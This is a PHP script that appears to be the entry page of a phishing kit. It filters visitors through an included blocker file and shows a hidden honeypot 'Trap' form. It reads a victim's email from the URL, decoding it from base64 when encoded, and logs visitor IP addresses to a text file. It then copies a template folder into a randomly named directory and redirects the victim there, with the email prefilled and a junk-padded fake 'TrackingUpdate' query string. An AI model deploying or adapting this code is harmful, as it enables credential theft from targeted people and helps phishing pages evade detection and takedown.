<?php ob_start(); ?>
<?php
session_start();
require_once('blocker.php');
echo '<html>
<head><title>Trap</title>
</head>
<body>
<form>
<input style="margin-left:-30px;margin-top:100px;display: none;" name="gotcha" type="submit" id="damn" value="fill">
</form>
</body>
</html>';

function isBase64($data)
{
    if (base64_encode(base64_decode($data)) === $data) {
        return true;
    } else {
        return false;
    }
}



$_SESSION['referer'] = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';

//$email = $_GET['email'];
$email =   isBase64($_GET['email'])? base64_decode($_GET['email']) : $_GET['email'];
$DIR=md5(rand(0,100000000000));
function recurse_copy($home,$DIR) {
$dir = opendir($home);
@mkdir($DIR);
while(false !== ( $file = readdir($dir)) ) {
if (( $file != '.' ) && ( $file != '..' )) {
if ( is_dir($home . '/' . $file) ) {
recurse_copy($home . '/' . $file,$DIR . '/' . $file);
}
else {
copy($home . '/' . $file,$DIR . '/' . $file);
}
}
}
closedir($dir);
}


$ip = getenv("REMOTE_ADDR");
$file = fopen("ip.txt","a");
fwrite($file,$ip."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\n");

$home="New";
recurse_copy( $home, $DIR );

exit(header("location:$DIR?email=$email&.email?auth=2&home=1&from=TrackingUpdate&product-request-id=bec7c79d-ad78-43ec-9c71-d12e379905d20cDovL3d3dy5he@#&^#&&787778377vhefhhgfnvshnHBsZS5jb20vc2hvcHwxYW9zNGJjMKJHlkgiutgKHklgklu66GY4MTI3ZGZhMWKJHKLGHGDJHKJNvbS9zaG9wL2FjY291bnQvc2V0dXAvc3RhcnQ_c="));


?>


